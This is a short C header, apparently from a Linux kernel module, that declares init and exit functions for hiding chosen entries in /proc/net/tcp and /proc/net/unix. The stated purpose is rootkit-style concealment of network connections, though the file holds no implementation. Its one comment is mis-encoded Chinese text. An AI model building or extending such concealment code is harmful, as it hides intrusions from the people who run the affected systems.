/* SPDX-License-Identifier: GPL-2.0-or-later */
#ifndef _HIDE_NET_H
#define _HIDE_NET_H

/* 闅愯棌 /proc/net/tcp 鍜?/proc/net/unix 涓殑鎸囧畾鐗瑰緛 */

int hide_net_init(void);
void hide_net_exit(void);

#endif /* _HIDE_NET_H */
